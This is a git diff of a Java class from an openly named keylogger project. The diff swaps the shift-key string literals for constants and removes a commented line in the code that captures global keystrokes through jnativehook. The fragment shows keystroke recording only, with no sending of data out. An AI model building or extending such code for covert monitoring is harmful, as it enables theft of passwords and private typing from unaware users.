@@ -1,5 +1,7 @@
 package com.mossad.keylogger.reader;
 
+import com.mmigdal.mossad.key.logger.library.KeyLoggerEntries;
+
 import org.jnativehook.keyboard.NativeKeyEvent;
 import org.jnativehook.keyboard.NativeKeyListener;
 
@@ -39,7 +41,6 @@ public class KeyReader implements NativeKeyListener {
 
     private void collectKeyEvent(NativeKeyEvent nativeKeyEvent, boolean keyPressed) {
         String keyText = NativeKeyEvent.getKeyText(nativeKeyEvent.getKeyCode());
-        //char keyChar = nativeKeyEvent.getKeyChar();
 
         if (keyPressed) {
 
@@ -48,13 +49,13 @@ public class KeyReader implements NativeKeyListener {
             }
 
             if (isShift(keyText)) {
-                keyText = generateShiftEntry("shift_pressed");
+                keyText = generateShiftEntry(KeyLoggerEntries.SHIFT_PRESSED);
             }
 
             readSigns.add(keyText);
         } else {
             if (isShift(keyText)) {
-                keyText = generateShiftEntry("shift_released");
+                keyText = generateShiftEntry(KeyLoggerEntries.SHIFT_RELEASED);
                 readSigns.add(keyText);
             }
         }
